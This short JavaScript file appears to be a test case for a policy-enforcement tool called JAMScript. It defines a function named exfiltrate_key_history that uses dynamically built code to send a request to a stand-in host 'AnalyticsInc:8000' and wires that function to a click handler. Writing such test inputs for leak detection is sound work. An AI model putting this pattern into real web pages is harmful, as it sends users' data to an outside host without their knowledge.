
JAM.startProfile('load');
function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func", true);xmlhttp.send(null);',exp=JAMScript.new(Function,[exp]);JAMScript.call(exp,null,[])}var v0=document.getElementById("test");JAMScript.set(v0,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
